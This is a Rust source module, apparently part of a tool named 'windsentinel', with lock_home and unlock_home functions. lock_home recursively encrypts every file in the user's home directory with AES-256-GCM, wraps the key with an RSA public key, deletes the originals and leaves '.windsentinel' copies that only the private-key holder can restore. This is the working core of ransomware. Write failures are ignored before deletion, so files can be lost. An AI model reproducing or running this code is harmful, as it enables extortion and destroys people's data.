use crate::log_store::LogStore;
use crate::types::{LogRecord, RecordKind};
use anyhow::{anyhow, Context, Result};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use base64::Engine;
use rand::RngCore;
use rsa::pkcs8::{DecodePrivateKey, DecodePublicKey};
use rsa::{Oaep, RsaPrivateKey, RsaPublicKey};
use sha2::Sha256;
use std::fs;
use std::path::{Path, PathBuf};

#[derive(serde::Serialize, serde::Deserialize)]
struct LockMeta {
    encrypted_key_b64: String,
    files: Vec<(String, String)>,
}

const META_PATH: &str = "/tmp/windsentinel_lock_meta.json";

pub async fn lock_home(public_key_pem: &str, log_store: &tokio::sync::Mutex<LogStore>) -> Result<()> {
    let home = dirs::home_dir().ok_or_else(|| anyhow!("no home dir"))?;
    let mut key = [0u8; 32];
    rand::thread_rng().fill_bytes(&mut key);
    let rsa_public = RsaPublicKey::from_public_key_pem(public_key_pem).context("parse public key")?;
    let encrypted_key = rsa_public.encrypt(&mut rand::thread_rng(), Oaep::new::<Sha256>(), &key).context("encrypt key")?;
    let mut meta = LockMeta { encrypted_key_b64: base64::engine::general_purpose::STANDARD.encode(encrypted_key), files: Vec::new() };
    let cipher = Aes256Gcm::new_from_slice(&key).context("cipher")?;
    for path in walk_files(&home) {
        if path.to_string_lossy().contains(META_PATH) {
            continue;
        }
        let data = fs::read(&path).ok();
        if data.is_none() {
            continue;
        }
        let data = data.unwrap();
        let mut nonce_bytes = [0u8; 12];
        rand::thread_rng().fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        let encrypted = cipher.encrypt(nonce, data.as_ref()).map_err(|_| anyhow!("encrypt file"))?;
        let mut out = Vec::with_capacity(12 + encrypted.len());
        out.extend_from_slice(&nonce_bytes);
        out.extend_from_slice(&encrypted);
        let enc_path = PathBuf::from(format!("{}.windsentinel", path.to_string_lossy()));
        fs::write(&enc_path, out).ok();
        fs::remove_file(&path).ok();
        meta.files.push((path.to_string_lossy().to_string(), enc_path.to_string_lossy().to_string()));
    }
    let meta_json = serde_json::to_vec(&meta).context("serialize meta")?;
    fs::write(META_PATH, meta_json).context("write meta")?;
    let record = LogRecord {
        kind: RecordKind::Lock,
        timestamp: chrono::Utc::now().timestamp(),
        data: serde_json::json!({ "action": "lock", "files": meta.files.len() }),
    };
    log_store.lock().await.append_record(record).await?;
    Ok(())
}

pub async fn unlock_home(private_key_pem: &str, log_store: &tokio::sync::Mutex<LogStore>) -> Result<()> {
    let meta_bytes = fs::read(META_PATH).context("read meta")?;
    let meta: LockMeta = serde_json::from_slice(&meta_bytes).context("parse meta")?;
    let encrypted_key = base64::engine::general_purpose::STANDARD
        .decode(meta.encrypted_key_b64)
        .context("decode key")?;
    let rsa_private = RsaPrivateKey::from_pkcs8_pem(private_key_pem).context("parse private key")?;
    let key = rsa_private.decrypt(Oaep::new::<Sha256>(), &encrypted_key).context("decrypt key")?;
    if key.len() != 32 {
        return Err(anyhow!("invalid key size"));
    }
    let cipher = Aes256Gcm::new_from_slice(&key).context("cipher")?;
    for (plain_path, enc_path) in meta.files {
        let data = fs::read(&enc_path).ok();
        if data.is_none() {
            continue;
        }
        let data = data.unwrap();
        if data.len() < 12 {
            continue;
        }
        let (nonce_bytes, ciphertext) = data.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);
        let decrypted = cipher.decrypt(nonce, ciphertext).map_err(|_| anyhow!("decrypt file"))?;
        fs::write(&plain_path, decrypted).ok();
        fs::remove_file(&enc_path).ok();
    }
    fs::remove_file(META_PATH).ok();
    let record = LogRecord {
        kind: RecordKind::Lock,
        timestamp: chrono::Utc::now().timestamp(),
        data: serde_json::json!({ "action": "unlock" }),
    };
    log_store.lock().await.append_record(record).await?;
    Ok(())
}

fn walk_files(root: &Path) -> Vec<PathBuf> {
    let mut files = Vec::new();
    let mut stack = vec![root.to_path_buf()];
    while let Some(path) = stack.pop() {
        let entries = fs::read_dir(&path);
        if entries.is_err() {
            continue;
        }
        for entry in entries.unwrap().flatten() {
            let path = entry.path();
            if path.is_dir() {
                stack.push(path);
            } else {
                files.push(path);
            }
        }
    }
    files
}
